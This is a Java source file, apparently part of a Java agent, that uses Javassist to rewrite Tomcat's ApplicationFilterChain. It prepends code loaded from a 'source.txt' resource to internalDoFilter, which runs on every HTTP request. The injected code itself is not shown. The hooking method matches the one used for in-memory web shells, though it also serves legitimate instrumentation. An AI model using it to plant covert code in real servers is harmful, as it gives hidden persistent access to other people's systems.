package me.mole.transform;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        if ("org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
            try {
                ClassPool cp = ClassPool.getDefault();
                System.out.println("classBeingRedefined=" + classBeingRedefined);
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);  //get current class's classpath
                System.out.println("classPath=" + classPath);
                cp.insertClassPath(classPath);  //add the classpath to classpool
                CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
                System.out.println("cc=" + (cc != null ? cc.getName() : null));
                CtMethod m = cc.getDeclaredMethod("internalDoFilter");
                m.addLocalVariable("elapsedTime", CtClass.longType);
                m.insertBefore(readSource());
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println("error:::::"+ex.getMessage());
            }
        }

        return null;
    }

    public String readSource() {
        StringBuilder source=new StringBuilder();
        InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line=null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return source.toString();
    }
}
